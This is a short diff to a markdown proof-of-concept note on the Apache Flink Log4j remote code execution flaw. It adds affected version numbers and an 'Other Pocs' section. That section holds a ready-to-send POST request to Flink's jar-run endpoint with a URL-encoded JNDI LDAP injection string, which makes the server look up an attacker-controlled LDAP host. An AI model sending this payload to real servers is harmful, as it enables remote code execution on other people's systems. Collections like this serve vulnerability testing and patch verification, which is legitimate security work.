@@ -1,5 +1,11 @@
 # Apache Flink log4j RCE
 
+## Version
+
+```
+< v1.14.2, < v1.13.5, < v1.12.7, < v1.11.6
+```
+
 ## vulhub
 
 ```
@@ -32,4 +38,10 @@ public class Test {
 
 }
 
+```
+
+## Other Pocs
+
+```
+POST: http://0.0.0.0:8081/jars/${jndi:ldap:%252f%252f0.0.0.0%252f123}.jar/run
 ```
